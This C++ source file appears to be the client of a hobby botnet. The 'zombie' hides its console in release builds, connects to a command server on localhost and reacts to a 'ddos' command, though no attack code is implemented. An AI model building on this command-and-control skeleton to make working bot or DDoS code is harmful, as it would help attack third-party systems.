#include <iostream>
#include <thread>

#include "Client.h"

static std::string rcvMsg;
static std::string stopOptimizeThisWhileLoop;

void waitingForServerMsg(Client& zombie)
{
	while (true)
	{
		if (zombie.receiveFromServer())
			rcvMsg = zombie.getSrvMsg();
		while (!rcvMsg.empty())
			stopOptimizeThisWhileLoop = "Hope it wont get optimized";
	}
}


int main()
{
#ifdef RELEASE
	FreeConsole();
#endif
	std::cout << "Init Zombie" << std::endl;

	Client Zombie;

	if (!Zombie.init())
		return 0;

	if (Zombie.createSocket())
	{
		if (Zombie.connectToSrv("127.0.0.1", 54001))
		{
			std::cout << "connected" << std::endl;
			std::thread worker(waitingForServerMsg, std::ref(Zombie));
			while (true)
			{
				if (!rcvMsg.empty())
				{
					std::cout << rcvMsg << std::endl;
					if (rcvMsg == "ddos")
						Zombie.sendToSrv("Started Ddos");
					else
						Zombie.sendToSrv(rcvMsg);
					rcvMsg.clear();
				}
			}
			worker.detach();
		}
		else
		{
			std::cout << "Couldnt connect to srv" << std::endl;
		}
	}
	else
	{
		std::cout << "Couldnt create Socket" << std::endl;
	}
	
	std::cin.get();
	return 0;
}